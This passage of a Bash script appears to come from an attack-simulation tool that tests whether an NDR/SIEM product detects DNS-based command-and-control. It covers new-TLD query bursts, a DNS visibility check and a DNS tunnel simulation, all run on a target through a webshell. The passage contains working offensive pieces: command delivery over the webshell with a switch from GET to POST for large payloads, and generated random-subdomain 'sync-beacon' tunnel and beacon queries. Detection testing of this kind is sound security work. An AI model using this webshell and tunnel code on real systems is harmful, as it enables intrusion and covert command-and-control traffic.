    DNS_NEW_TLD_HTTPS_QUERIES="${https_q}"
    DNS_NEW_TLD_TXT_QUERIES="${txt_q}"
    dns_new_tld_compute_detection_likelihood "${unique}" "${domains}"
    return 0
}

dns_new_tld_replay_structured_logs() {
    local out="$1" line=""
    while IFS= read -r line; do
        line=$(printf '%s' "${line}" | tr -d '\r')
        [[ -z "${line}" ]] && continue
        case "${line}" in
            DNS_NEW_TLD_TEST_START*|DNS_NEW_TLD_QUERY*|DNS_NEW_TLD_TLD_STATS*|DNS_NEW_TLD_SUMMARY*|DNS_NEW_TLD_ROOT_CAUSE*|DNS_NEW_TLD_FINAL_SUMMARY*|ROOT_CAUSE*)
                dns_new_tld_log_both "${line}"
                ;;
        esac
    done <<< "$(printf '%s\n' "${out}" | tr -d '\r' | grep -E '^DNS_NEW_TLD_' || true)"
}

finalize_dns_new_tld_stage_judgment() {
    local stage_label="${1:-DNS New TLD Test}" detail_prefix="${2:-}"
    local detail="" stage_msg=""
    if (( $(safe_int "${DNS_NEW_TLD_ACTUAL_DNS_QUERIES_SENT:-0}") == 0 )) && (( DNS_NEW_TLD_QUERY_COUNT > 0 )); then
        DNS_NEW_TLD_ACTUAL_DNS_QUERIES_SENT="${DNS_NEW_TLD_QUERY_COUNT}"
    fi
    if (( $(safe_int "${DNS_NEW_TLD_ACTUAL_DNS_RESPONSES:-0}") == 0 )) && (( DNS_NEW_TLD_SUCCESSFUL_QUERIES + DNS_NEW_TLD_FAILED_QUERIES > 0 )); then
        DNS_NEW_TLD_ACTUAL_DNS_RESPONSES=$((DNS_NEW_TLD_SUCCESSFUL_QUERIES + DNS_NEW_TLD_FAILED_QUERIES))
    fi
    dns_new_tld_compute_detection_likelihood "${DNS_NEW_TLD_UNIQUE_TLDS}" "${DNS_NEW_TLD_TESTED_DOMAINS}"
    if (( DNS_NEW_TLD_SUCCESSFUL_QUERIES == 0 )); then
        DNS_NEW_TLD_STAGE_STATUS="Failed"
        DNS_NEW_TLD_FINAL_RESULT="failed"
        [[ -z "${DNS_NEW_TLD_SKIP_REASON}" ]] && DNS_NEW_TLD_SKIP_REASON="successful_queries=0"
    elif (( DNS_NEW_TLD_UNIQUE_TLDS >= 5 && DNS_NEW_TLD_SUCCESSFUL_QUERIES >= 10 && DNS_NEW_TLD_ACTUAL_DNS_QUERIES_SENT >= 10 )) && [[ "${DNS_NEW_TLD_DETECTION_LIKELIHOOD}" == HIGH ]]; then
        DNS_NEW_TLD_STAGE_STATUS="Success"
        DNS_NEW_TLD_FINAL_RESULT="success"
    elif (( DNS_NEW_TLD_UNIQUE_TLDS >= 3 && DNS_NEW_TLD_SUCCESSFUL_QUERIES > 0 )); then
        DNS_NEW_TLD_STAGE_STATUS="Partial"
        DNS_NEW_TLD_FINAL_RESULT="partial"
        DNS_NEW_TLD_SKIP_REASON="${DNS_NEW_TLD_DETECTION_REASON:-partial_new_tld_pattern}"
    else
        DNS_NEW_TLD_STAGE_STATUS="Partial"
        DNS_NEW_TLD_FINAL_RESULT="partial"
        DNS_NEW_TLD_SKIP_REASON="${DNS_NEW_TLD_DETECTION_REASON:-below_success_threshold}"
    fi
    if [[ "${DNS_NEW_TLD_STAGE_STATUS}" == Success ]] && \
        { (( DNS_NEW_TLD_UNIQUE_TLDS < 5 )) || (( DNS_NEW_TLD_SUCCESSFUL_QUERIES < 10 )) || (( DNS_NEW_TLD_ACTUAL_DNS_QUERIES_SENT < 10 )) || [[ "${DNS_NEW_TLD_DETECTION_LIKELIHOOD}" != "HIGH" ]]; }; then
        DNS_NEW_TLD_STAGE_STATUS="Partial"
        DNS_NEW_TLD_FINAL_RESULT="partial"
        DNS_NEW_TLD_SKIP_REASON="success_downgraded unique_tlds=${DNS_NEW_TLD_UNIQUE_TLDS} successful=${DNS_NEW_TLD_SUCCESSFUL_QUERIES} actual_sent=${DNS_NEW_TLD_ACTUAL_DNS_QUERIES_SENT} likelihood=${DNS_NEW_TLD_DETECTION_LIKELIHOOD}"
    fi
    case "${DNS_NEW_TLD_STAGE_STATUS}" in
        Success) detail="${detail_prefix}likelihood=${DNS_NEW_TLD_DETECTION_LIKELIHOOD} domains=${DNS_NEW_TLD_TESTED_DOMAINS} unique_tlds=${DNS_NEW_TLD_UNIQUE_TLDS} queries=${DNS_NEW_TLD_QUERY_COUNT} resolver=${DNS_NEW_TLD_RESOLVER}" ;;
        Partial) detail="${detail_prefix}likelihood=${DNS_NEW_TLD_DETECTION_LIKELIHOOD} domains=${DNS_NEW_TLD_TESTED_DOMAINS} unique_tlds=${DNS_NEW_TLD_UNIQUE_TLDS} reason=${DNS_NEW_TLD_DETECTION_REASON} resolver=${DNS_NEW_TLD_RESOLVER}" ;;
        Skipped) detail="${detail_prefix}${DNS_NEW_TLD_SKIP_REASON:-skipped}" ;;
        *) detail="${detail_prefix}${DNS_NEW_TLD_SKIP_REASON:-failed queries=${DNS_NEW_TLD_QUERY_COUNT:-0}}" ;;
    esac
    set_stage_result "${stage_label}" "${DNS_NEW_TLD_STAGE_STATUS}" "${detail}"
    local root_suffix=""
    [[ "${DNS_NEW_TLD_STAGE_STATUS}" == Failed && -n "${DNS_NEW_TLD_LAST_ROOT_CAUSE:-}" ]] && root_suffix=" root_cause=${DNS_NEW_TLD_LAST_ROOT_CAUSE}"
    stage_msg="DNS_NEW_TLD_STAGE_FINAL_SUMMARY stage=${stage_label} status=${DNS_NEW_TLD_STAGE_STATUS} tested_domains=${DNS_NEW_TLD_TESTED_DOMAINS} unique_tlds=${DNS_NEW_TLD_UNIQUE_TLDS} query_count=${DNS_NEW_TLD_QUERY_COUNT} successful_queries=${DNS_NEW_TLD_SUCCESSFUL_QUERIES} failed_queries=${DNS_NEW_TLD_FAILED_QUERIES} detection_likelihood=${DNS_NEW_TLD_DETECTION_LIKELIHOOD} resolver=${DNS_NEW_TLD_RESOLVER:-n/a} result=${DNS_NEW_TLD_FINAL_RESULT}${root_suffix}"
    dns_new_tld_log_both "${stage_msg}"
    local summary_msg="DNS_NEW_TLD_SUMMARY tested_domains=${DNS_NEW_TLD_TESTED_DOMAINS} tested_tlds=${DNS_NEW_TLD_TESTED_TLDS} unique_tlds=${DNS_NEW_TLD_UNIQUE_TLDS} query_count=${DNS_NEW_TLD_QUERY_COUNT} query_types=${DNS_NEW_TLD_QUERY_TYPES} successful_queries=${DNS_NEW_TLD_SUCCESSFUL_QUERIES} failed_queries=${DNS_NEW_TLD_FAILED_QUERIES} generated=${DNS_NEW_TLD_GENERATED:-0} valid=${DNS_NEW_TLD_VALID_FQDNS:-0} invalid=${DNS_NEW_TLD_INVALID_FQDNS:-0} duration_seconds=${DNS_NEW_TLD_DURATION_SECONDS} detection_likelihood=${DNS_NEW_TLD_DETECTION_LIKELIHOOD}"
    dns_new_tld_log_both "${summary_msg}"
    local final_msg="DNS_NEW_TLD_FINAL_SUMMARY generated=${DNS_NEW_TLD_GENERATED:-0} valid=${DNS_NEW_TLD_VALID_FQDNS:-0} invalid=${DNS_NEW_TLD_INVALID_FQDNS:-0} successful_queries=${DNS_NEW_TLD_SUCCESSFUL_QUERIES} failed_queries=${DNS_NEW_TLD_FAILED_QUERIES} unique_tlds=${DNS_NEW_TLD_UNIQUE_TLDS} actual_dns_queries_sent=${DNS_NEW_TLD_ACTUAL_DNS_QUERIES_SENT:-0} actual_dns_responses=${DNS_NEW_TLD_ACTUAL_DNS_RESPONSES:-0} actual_unique_tlds=${DNS_NEW_TLD_UNIQUE_TLDS:-0} resolver_validation_result=${DNS_RESOLVER_VALIDATION_RESULT:-failed} resolver=${DNS_NEW_TLD_RESOLVER:-n/a} detection_likelihood=${DNS_NEW_TLD_DETECTION_LIKELIHOOD} root_cause=${DNS_NEW_TLD_LAST_ROOT_CAUSE:-none} result=${DNS_NEW_TLD_FINAL_RESULT}"
    dns_new_tld_log_both "${final_msg}"
}

run_dns_new_tld_test() {
    local resolver="" tool="" out="" dns_cmd="" payload_bytes=0 saved_ws_method="" domain_count=0 t0=0 t1=0
    DNS_NEW_TLD_SKIP_REASON=""
    DNS_NEW_TLD_STAGE_STATUS="skipped"
    DNS_NEW_TLD_FINAL_RESULT="skipped"
    DNS_NEW_TLD_TESTED_DOMAINS=0
    DNS_NEW_TLD_UNIQUE_TLDS=0
    DNS_NEW_TLD_QUERY_COUNT=0
    DNS_NEW_TLD_SUCCESSFUL_QUERIES=0
    DNS_NEW_TLD_FAILED_QUERIES=0
    DNS_NEW_TLD_ACTUAL_DNS_QUERIES_SENT=0
    DNS_NEW_TLD_ACTUAL_DNS_RESPONSES=0
    DNS_NEW_TLD_DURATION_SECONDS=0

    if [[ "${DNS_NEW_TLD_ENABLED}" != true ]]; then
        DNS_NEW_TLD_SKIP_REASON="disabled"
        dns_new_tld_log_both "DNS new TLD test skipped (disabled)"
        return 0
    fi

    domain_count=$((20 + RANDOM % 31))
    (( domain_count < DNS_NEW_TLD_MIN_DOMAINS )) && domain_count="${DNS_NEW_TLD_MIN_DOMAINS}"
    (( domain_count > DNS_NEW_TLD_MAX_DOMAINS )) && domain_count="${DNS_NEW_TLD_MAX_DOMAINS}"

    if [[ "${DRY_RUN}" == true ]]; then
        DNS_NEW_TLD_RESOLVER="${DGA_DNS_SERVER:-10.10.10.5}"
        DNS_NEW_TLD_RESOLVER_SOURCE="${DGA_DNS_SOURCE:-scan}"
        DNS_NEW_TLD_TESTED_DOMAINS="${domain_count}"
        DNS_NEW_TLD_UNIQUE_TLDS=8
        DNS_NEW_TLD_QUERY_COUNT=$((domain_count * 4))
        DNS_NEW_TLD_SUCCESSFUL_QUERIES=$((domain_count * 4 - 2))
        DNS_NEW_TLD_FAILED_QUERIES=2
        DNS_NEW_TLD_QUERY_TYPES="A=$((domain_count))/AAAA=$((domain_count/5))/HTTPS=$((domain_count/5))/TXT=$((domain_count/5))"
        DNS_NEW_TLD_TESTED_TLDS="click fun top link xyz page icu wiki"
        DNS_NEW_TLD_ACTUAL_DNS_QUERIES_SENT="${DNS_NEW_TLD_QUERY_COUNT}"
        DNS_NEW_TLD_ACTUAL_DNS_RESPONSES="${DNS_NEW_TLD_QUERY_COUNT}"
        dns_new_tld_compute_detection_likelihood 8 "${domain_count}"
        DNS_NEW_TLD_STAGE_STATUS="Success"
        DNS_NEW_TLD_FINAL_RESULT="success"
        dns_new_tld_log_both "DNS_NEW_TLD_TEST_START resolver=${DNS_NEW_TLD_RESOLVER} tool=dig planned_domains=${domain_count} dry_run=yes"
        dns_new_tld_log_both "DNS_NEW_TLD_SUMMARY tested_domains=${DNS_NEW_TLD_TESTED_DOMAINS} tested_tlds=${DNS_NEW_TLD_TESTED_TLDS} unique_tlds=${DNS_NEW_TLD_UNIQUE_TLDS} query_count=${DNS_NEW_TLD_QUERY_COUNT} query_types=${DNS_NEW_TLD_QUERY_TYPES} successful_queries=${DNS_NEW_TLD_SUCCESSFUL_QUERIES} failed_queries=${DNS_NEW_TLD_FAILED_QUERIES} duration_seconds=0 detection_likelihood=${DNS_NEW_TLD_DETECTION_LIKELIHOOD}"
        return 0
    fi

    if ! dns_new_tld_resolve_query_tool; then
        DNS_NEW_TLD_LAST_ROOT_CAUSE="dns_tool_missing"
        dns_new_tld_log_both "skip reason=${DNS_NEW_TLD_SKIP_REASON}"
        return 1
    fi

    resolver=$(dga_ensure_resolver) || resolver=""
    if [[ -z "${resolver}" ]]; then
        DNS_NEW_TLD_SKIP_REASON="resolver_unreachable"
        DNS_NEW_TLD_LAST_ROOT_CAUSE="resolver_unreachable"
        dns_new_tld_log_both "skip reason=${DNS_NEW_TLD_SKIP_REASON}"
        return 1
    fi
    DNS_NEW_TLD_RESOLVER="${resolver}"
    DNS_NEW_TLD_RESOLVER_SOURCE="${DGA_DNS_SOURCE:-unknown}"
    tool="${DNS_NEW_TLD_QUERY_TOOL}"

    dns_cmd=$(build_dns_new_tld_simulation_remote_cmd "${resolver}" "${domain_count}" "${tool}")
    if ! precheck_dns_remote_payload_syntax "${dns_cmd}" "DNS_NEW_TLD_SCRIPT"; then
        DNS_NEW_TLD_SKIP_REASON="dns_query_failed"
        dns_new_tld_log_root_cause "payload_encode_failure" "DNS_PAYLOAD_SYNTAX_ERROR local_or_remote_precheck"
        return 1
    fi
    payload_bytes=${#dns_cmd}
    saved_ws_method="${WEBSHELL_METHOD}"
    DNS_NEW_TLD_LAST_PAYLOAD_BYTES="${payload_bytes}"
    DNS_NEW_TLD_LAST_WEBSHELL_METHOD="${WEBSHELL_METHOD:-GET}"
    dns_new_tld_log_both "DNS_NEW_TLD_PAYLOAD_TRANSPORT payload_bytes=${payload_bytes} webshell_method=${WEBSHELL_METHOD:-GET} limit=${PAYLOAD_WARN_BYTES} planned_domains=${domain_count}"
    if (( payload_bytes > PAYLOAD_WARN_BYTES )) && [[ "${WEBSHELL_METHOD}" == GET ]]; then
        WEBSHELL_METHOD=POST
        dns_new_tld_log_both "webshell switched GET->POST for DNS new TLD payload (${payload_bytes} bytes)"
    fi
    t0=$(date +%s)
    out=$(run_webshell_long "dns-new-tld-test" "${dns_cmd}" 2>/dev/null || true)
    WEBSHELL_METHOD="${saved_ws_method}"
    DNS_NEW_TLD_LAST_REMOTE_OUT="${out}"
    DNS_NEW_TLD_LAST_REMOTE_PAYLOAD="${dns_cmd}"
    t1=$(date +%s)
    DNS_NEW_TLD_DURATION_SECONDS=$((t1 - t0))

    if [[ -z "${out}" || "${out}" != *"DNS_NEW_TLD_SUMMARY"* ]]; then
        DNS_NEW_TLD_SKIP_REASON=$(dns_new_tld_classify_failure_root_cause "${out}" "${dns_cmd}")
        dns_new_tld_log_root_cause "${DNS_NEW_TLD_SKIP_REASON}" "simulation_output_missing_or_incomplete"
        poc_log_root_cause_analysis "DNS_NEW_TLD" "${dns_cmd}" "${out}"
        dns_new_tld_log_both "simulation_failed reason=${DNS_NEW_TLD_SKIP_REASON}"
        return 1
    fi

    dns_new_tld_replay_structured_logs "${out}"
    parse_dns_new_tld_output "${out}" || true
    local summary_line=""
    summary_line=$(printf '%s\n' "${out}" | grep -E '^DNS_NEW_TLD_SUMMARY' | tail -n1 || true)
    if [[ -n "${summary_line}" ]]; then
        summary_line="${summary_line/SUMMARY tested_domains=/SUMMARY tested_domains=}"
        summary_line=$(printf '%s' "${summary_line}" | sed "s/duration_seconds=[0-9]*/duration_seconds=${DNS_NEW_TLD_DURATION_SECONDS}/")
        summary_line=$(printf '%s' "${summary_line}" | sed "s/detection_likelihood=[A-Z]*/detection_likelihood=${DNS_NEW_TLD_DETECTION_LIKELIHOOD}/")
        dns_new_tld_log_both "${summary_line#DNS_NEW_TLD_}"
        dns_new_tld_log_both "DNS_NEW_TLD_SUMMARY tested_domains=${DNS_NEW_TLD_TESTED_DOMAINS} tested_tlds=${DNS_NEW_TLD_TESTED_TLDS} unique_tlds=${DNS_NEW_TLD_UNIQUE_TLDS} query_count=${DNS_NEW_TLD_QUERY_COUNT} query_types=${DNS_NEW_TLD_QUERY_TYPES} successful_queries=${DNS_NEW_TLD_SUCCESSFUL_QUERIES} failed_queries=${DNS_NEW_TLD_FAILED_QUERIES} duration_seconds=${DNS_NEW_TLD_DURATION_SECONDS} detection_likelihood=${DNS_NEW_TLD_DETECTION_LIKELIHOOD}"
    fi
    if (( DNS_NEW_TLD_SUCCESSFUL_QUERIES == 0 && DNS_NEW_TLD_QUERY_COUNT > 0 )); then
        dns_new_tld_log_root_cause "resolver_failure" "all_queries_failed_or_timeout"
    elif (( DNS_NEW_TLD_UNIQUE_TLDS < 5 || DNS_NEW_TLD_SUCCESSFUL_QUERIES < 10 )); then
        dns_new_tld_log_root_cause "${DNS_NEW_TLD_DETECTION_REASON:-below_success_threshold}" "unique_tlds=${DNS_NEW_TLD_UNIQUE_TLDS} successful=${DNS_NEW_TLD_SUCCESSFUL_QUERIES}"
    fi
    return 0
}

followup_stage_dns_new_tld() {
    local sim_rc=0
    [[ "${DNS_NEW_TLD_ENABLED}" != true ]] && {
        add_skipped_stage "DNS New TLD Test" "disabled (--disable-dns-new-tld)"
        set_stage_result "DNS New TLD Test" "Skipped" "disabled"
        DNS_NEW_TLD_STAGE_STATUS="skipped"
        DNS_NEW_TLD_SKIP_REASON="disabled"
        write_report_entries "dns_new_tld" "T1071" "NDR/SIEM" "DNS New TLD Test" "${TARGET_NET}" "skipped" "disabled"
        poc_run_dns_new_tld_live_log_validation || true
        return 0
    }
    poc_obs_stage_start "DNS New TLD Test"
    add_executed_stage "DNS New TLD Test"
    write_report_entries "dns_new_tld" "T1071" "NDR/SIEM" "DNS New TLD Test" "${TARGET_NET}" "start" "new-TLD DNS query burst (dns_new_tld analytics validation)"
    sim_rc=0
    run_dns_new_tld_test || sim_rc=$?
    finalize_dns_new_tld_stage_judgment "DNS New TLD Test" "dns_new_tld "
    case "${DNS_NEW_TLD_STAGE_STATUS}" in
        Success)
            write_report_entries "dns_new_tld" "T1071" "NDR/SIEM" "DNS New TLD Test" "${TARGET_NET}" "success" "domains=${DNS_NEW_TLD_TESTED_DOMAINS} unique_tlds=${DNS_NEW_TLD_UNIQUE_TLDS} likelihood=${DNS_NEW_TLD_DETECTION_LIKELIHOOD}"
            ;;
        Partial)
            write_report_entries "dns_new_tld" "T1071" "NDR/SIEM" "DNS New TLD Test" "${TARGET_NET}" "partial" "${DNS_NEW_TLD_DETECTION_REASON:-partial}"
            ;;
        Skipped)
            write_report_entries "dns_new_tld" "T1071" "NDR/SIEM" "DNS New TLD Test" "${TARGET_NET}" "skipped" "${DNS_NEW_TLD_SKIP_REASON:-skipped}"
            ;;
        *)
            write_report_entries "dns_new_tld" "T1071" "NDR/SIEM" "DNS New TLD Test" "${TARGET_NET}" "failed" "${DNS_NEW_TLD_SKIP_REASON:-failed}"
            ;;
    esac
    poc_run_dns_new_tld_live_log_validation || true
    poc_obs_stage_end "DNS New TLD Test"
    return "${sim_rc}"
}

write_dns_new_tld_report() {
    [[ -z "${REPORT_MD}" ]] && return 0
    cat <<EOF >> "${REPORT_MD}" 2>/dev/null || true

## DNS New TLD Test

| Field | Value |
|---|---|
| Resolver | ${DNS_NEW_TLD_RESOLVER:-n/a} (source=${DNS_NEW_TLD_RESOLVER_SOURCE:-unknown}) |
| Query tool | ${DNS_NEW_TLD_QUERY_TOOL:-n/a} |
| Tested domains | ${DNS_NEW_TLD_TESTED_DOMAINS:-0} |
| Tested TLDs | ${DNS_NEW_TLD_TESTED_TLDS:-n/a} |
| Unique TLDs | ${DNS_NEW_TLD_UNIQUE_TLDS:-0} |
| Query count | ${DNS_NEW_TLD_QUERY_COUNT:-0} |
| Query types (A/AAAA/HTTPS/TXT) | ${DNS_NEW_TLD_A_QUERIES:-0} / ${DNS_NEW_TLD_AAAA_QUERIES:-0} / ${DNS_NEW_TLD_HTTPS_QUERIES:-0} / ${DNS_NEW_TLD_TXT_QUERIES:-0} |
| Successful queries | ${DNS_NEW_TLD_SUCCESSFUL_QUERIES:-0} |
| Failed queries | ${DNS_NEW_TLD_FAILED_QUERIES:-0} |
| Duration (seconds) | ${DNS_NEW_TLD_DURATION_SECONDS:-0} |
| Detection likelihood | ${DNS_NEW_TLD_DETECTION_LIKELIHOOD:-LOW} |
| Skip / failure reason | ${DNS_NEW_TLD_SKIP_REASON:-none} |

### Expected Stellar detection
- **Event:** \`dns_new_tld\` (subtype \`dns_new_tld_sensor\`)
- **Kill chain:** Initial Attempts
- **Tactic / Technique:** TA0011 Command and Control / T1071 Application Layer Protocol
- **Also likely:** DNS Anomaly, Top-Level Domain Anomaly
- **Severity reference:** 20

EOF
}

run_dns_visibility_validation() {
    local resolver="$1" tool="${DNS_TUNNEL_QUERY_TOOL:-dig}" out="" dns_cmd="" fqdn="" qtype="" result=""
    local seed_domains="google.com microsoft.com amazon.com"
    local random_domains="xxxxx.com yyyyyy.net"
    DNS_VISIBILITY_GENERATED=0
    DNS_VISIBILITY_SENT=0
    DNS_VISIBILITY_RESPONSE=0
    DNS_VISIBILITY_TIMEOUT=0
    DNS_VISIBILITY_ERROR=0
    [[ -z "${resolver}" ]] && return 1
    dns_cmd=$(cat <<EOF
srv='${resolver}'
tool='${tool}'
dns_to(){ case "\$1" in *timed\ out*|*TIMEOUT*|*refused*|*unreachable*) return 0;; esac; return 1; }
dns_nx(){ case "\$1" in *NXDOMAIN*|*"not found"*|*"can't find"*) return 0;; esac; return 1; }
run_vq(){
  local fq="\$1" qt="\$2" out="" rc=0 result="error"
  printf 'QUERY_GENERATED fqdn=%s qtype=%s stage=dns_visibility_validation\n' "\$fq" "\$qt"
  if [ "\$tool" = nslookup ]; then out=\$(nslookup -timeout=2 "\$fq" "\$srv" 2>&1)
  elif [ "\$tool" = host ]; then out=\$(host -W 2 -t "\$qt" "\$fq" "\$srv" 2>&1)
  else out=\$(dig +time=2 +tries=1 @"\$srv" "\$fq" "\$qt" +noall +answer +comments 2>&1); fi
  rc=\$?
  printf 'QUERY_SENT fqdn=%s qtype=%s stage=dns_visibility_validation\n' "\$fq" "\$qt"
  if dns_to "\$out"; then result=timeout; printf 'QUERY_TIMEOUT fqdn=%s qtype=%s stage=dns_visibility_validation\n' "\$fq" "\$qt"
  elif dns_nx "\$out"; then result=nxdomain
  elif [ -n "\$out" ]; then result=resolved
  else result=error; printf 'QUERY_ERROR fqdn=%s qtype=%s stage=dns_visibility_validation reason=empty_response\n' "\$fq" "\$qt"; fi
  printf 'QUERY_RESPONSE fqdn=%s qtype=%s stage=dns_visibility_validation rcode=%s\n' "\$fq" "\$qt" "\$result"
}
for d in ${seed_domains}; do run_vq "\$d" A; done
for d in ${random_domains}; do run_vq "\$d" A; done
EOF
)
    out=$(run_webshell_quick "dns-visibility-validation" "${dns_cmd}" 2>/dev/null || true)
    DNS_VISIBILITY_GENERATED=$(printf '%s\n' "${out}" | tr -d '\r' | grep -c '^QUERY_GENERATED ' || true)
    DNS_VISIBILITY_SENT=$(printf '%s\n' "${out}" | tr -d '\r' | grep -c '^QUERY_SENT ' || true)
    DNS_VISIBILITY_RESPONSE=$(printf '%s\n' "${out}" | tr -d '\r' | grep -c '^QUERY_RESPONSE ' || true)
    DNS_VISIBILITY_TIMEOUT=$(printf '%s\n' "${out}" | tr -d '\r' | grep -c '^QUERY_TIMEOUT ' || true)
    DNS_VISIBILITY_ERROR=$(printf '%s\n' "${out}" | tr -d '\r' | grep -c '^QUERY_ERROR ' || true)
    DNS_VISIBILITY_GENERATED=$(safe_int "${DNS_VISIBILITY_GENERATED}")
    DNS_VISIBILITY_SENT=$(safe_int "${DNS_VISIBILITY_SENT}")
    DNS_VISIBILITY_RESPONSE=$(safe_int "${DNS_VISIBILITY_RESPONSE}")
    DNS_VISIBILITY_TIMEOUT=$(safe_int "${DNS_VISIBILITY_TIMEOUT}")
    DNS_VISIBILITY_ERROR=$(safe_int "${DNS_VISIBILITY_ERROR}")
    DNS_SENSOR_EXPECTED_VISIBILITY="LOW"
    if (( DNS_VISIBILITY_SENT >= 5 && DNS_VISIBILITY_RESPONSE >= 3 )); then
        DNS_SENSOR_EXPECTED_VISIBILITY="HIGH"
    elif (( DNS_VISIBILITY_SENT >= 3 )); then
        DNS_SENSOR_EXPECTED_VISIBILITY="MEDIUM"
    fi
    local summary="DNS_VISIBILITY_SUMMARY generated=${DNS_VISIBILITY_GENERATED} sent=${DNS_VISIBILITY_SENT} response=${DNS_VISIBILITY_RESPONSE} timeout=${DNS_VISIBILITY_TIMEOUT} error=${DNS_VISIBILITY_ERROR} resolver=${resolver} sensor_expected_visibility=${DNS_SENSOR_EXPECTED_VISIBILITY}"
    state_append "dns_visibility_validation.log" "${summary}"
    dns_tunnel_log_both "${summary}"
    return 0
}

followup_stage_dns() {
    local dns_hosts count="${DNS_BURST_COUNT}" sim_rc=0 dns_stage_set=false out="" attempted=0
    reset_dns_tunnel_execution_stats
    add_executed_stage "DNS Tunnel"
    write_report_entries "dns_tunnel" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "start" "Stellar-pattern DNS tunnel simulation intensity=${FOLLOWUP_INTENSITY}"
    count=$(safe_int "${count}")
    (( count < DNS_TUNNEL_MIN_QUERIES )) && count="${DNS_TUNNEL_MIN_QUERIES}"
    (( count > DNS_TUNNEL_MAX_QUERIES )) && count="${DNS_TUNNEL_MAX_QUERIES}"

    sim_rc=0
    if [[ "${DRY_RUN}" != true ]]; then
        local visibility_resolver=""
        visibility_resolver=$(select_dns_tunnel_target 2>/dev/null || true)
        visibility_resolver=$(poc_extract_ipv4 "${visibility_resolver}")
        [[ -n "${visibility_resolver}" ]] && run_dns_visibility_validation "${visibility_resolver}" || true
    fi
    run_dns_tunnel_simulation "${count}" "${DNS_TUNNEL_MODE}" || sim_rc=$?

    if [[ "${DRY_RUN}" == true ]]; then
        followup_record_dns "${DNS_QUERIES_ATTEMPTED:-${count}}"
        set_stage_result "DNS Tunnel" "Success" "dry-run Stellar-pattern simulation"
        write_report_entries "dns_tunnel" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "success" "dns simulation planned"
        poc_run_dns_tunnel_live_log_validation || true
        return 0
    fi

    if [[ "${DNS_TUNNEL_SKIP_REASON}" == "dns_server_validation_failed" && -z "${DNS_TARGET_SERVER}" && -z "${DNS_SELECTED_DNS}" ]]; then
        DNS_TUNNEL_STAGE_STATUS="skipped"
        set_stage_result "DNS Tunnel" "Skipped" "dns_server_validation_failed"
        write_report_entries "dns_tunnel" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "skipped" "dns_server_validation_failed"
        dns_tunnel_log_both "skip reason=dns_server_validation_failed"
        poc_run_dns_tunnel_live_log_validation || true
        return 0
    fi

    if (( sim_rc != 0 && DNS_QUERIES_ATTEMPTED == 0 )); then
        local dns_cmd fb_server="${DNS_TARGET_SERVER}" dom="${DNS_TUNNEL_DOMAIN_SUFFIX}"
        fb_server=$(poc_extract_ipv4 "${fb_server}")
        dns_tunnel_log_both "fallback legacy entropy burst @${fb_server:-system} (simulation unavailable: ${DNS_TUNNEL_SKIP_REASON:-unknown})"
        if [[ "${HAS_dig:-false}" == true || "${HAS_nslookup:-false}" == true ]]; then
            dns_cmd="${REMOTE_SHELL_HELPERS} srv='${fb_server}'; dom='${dom}'; sent=0; for i in \$(seq_list ${count}); do"
            if [[ "${HAS_dig:-false}" == true && -n "${fb_server}" ]]; then
                dns_cmd+=" rl=\$(rand_bytes 6 | tr -dc 'A-Z2-7' | head -c 16); q=\"sync-beacon.\${rl}.\${dom}\"; out=\$(dig +time=2 +tries=1 @\"\$srv\" \"\$q\" A +noall +answer +comments 2>&1); case \"\$out\" in *timed\\ out*|*refused*) ;; *) sent=\$((sent+1));; esac;"
                dns_cmd+=" rl2=\$(rand_bytes 6 | tr -dc 'A-Z2-7' | head -c 16); q2=\"\${rl2}.\${rl}.\${dom}\"; out2=\$(dig +time=2 +tries=1 @\"\$srv\" \"\$q2\" TXT +noall +answer +comments 2>&1); case \"\$out2\" in *timed\\ out*|*refused*) ;; *) sent=\$((sent+1));; esac;"
            elif [[ "${HAS_dig:-false}" == true ]]; then
                dns_cmd+=" q=\$(printf '%s.%s.%s' \"\$(rand_bytes 6 | tr -dc 'a-z0-9' | head -c 10)\" \"\$(rand_bytes 6 | tr -dc 'A-Z2-7' | head -c 12)\" \"\${dom}\"); dig +short \"\$q\" A >/dev/null 2>&1; dig +short \"\$q\" TXT >/dev/null 2>&1; sent=\$((sent+2));"
            else
                dns_cmd+=" q=\"\$(build_remote_dns_random_query)\"; nslookup \"\$q\" \"\${srv}\" >/dev/null 2>&1; sent=\$((sent+1));"
            fi
            dns_cmd+=" sleep \$((RANDOM%2)); done; echo DNS_CHUNK_STATS attempted=\$sent eff_tld=\$sent"
            out=$(run_webshell_long "dns-aggressive-burst" "${dns_cmd}" 2>/dev/null || true)
            read -r attempted _ <<< "$(parse_dns_chunk_stats_line "${out}")"
            attempted=$(safe_int "${attempted}")
            DNS_QUERIES_ATTEMPTED="${attempted}"
            DNS_TUNNEL_UNIQUE_QUERIES="${attempted}"
            followup_record_dns "${attempted}"
            set_stage_result "DNS Tunnel" "Fallback" "shell DNS tunnel burst sent=${attempted} (${DNS_TUNNEL_SKIP_REASON:-sim failed})"
            dns_stage_set=true
        else
            DNS_TUNNEL_SKIP_REASON="${DNS_TUNNEL_SKIP_REASON:-dig/nslookup/host unavailable}"
            DNS_TUNNEL_STAGE_STATUS="skipped"
            set_stage_result "DNS Tunnel" "Skipped" "${DNS_TUNNEL_SKIP_REASON}"
            write_report_entries "dns_tunnel" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "skipped" "${DNS_TUNNEL_SKIP_REASON}"
            poc_run_dns_tunnel_live_log_validation || true
            return 0
        fi
    fi

    if [[ "${dns_stage_set}" != true ]]; then
        followup_record_dns "${DNS_QUERIES_ATTEMPTED}"
        finalize_dns_tunnel_stage_judgment "DNS Tunnel" "Stellar-pattern simulation "
        log_dns_tunnel_final_summary "${DNS_TUNNEL_STAGE_STATUS:-failed}"
    fi
    case "${DNS_TUNNEL_STAGE_STATUS}" in
        success) write_report_entries "dns_tunnel" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "success" "dns tunnel simulation attempted=${DNS_QUERIES_ATTEMPTED}" ;;
        partial|fallback) write_report_entries "dns_tunnel" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "partial" "dns tunnel partial attempted=${DNS_QUERIES_ATTEMPTED}" ;;
        skipped) write_report_entries "dns_tunnel" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "skipped" "${DNS_TUNNEL_SKIP_REASON:-skipped}" ;;
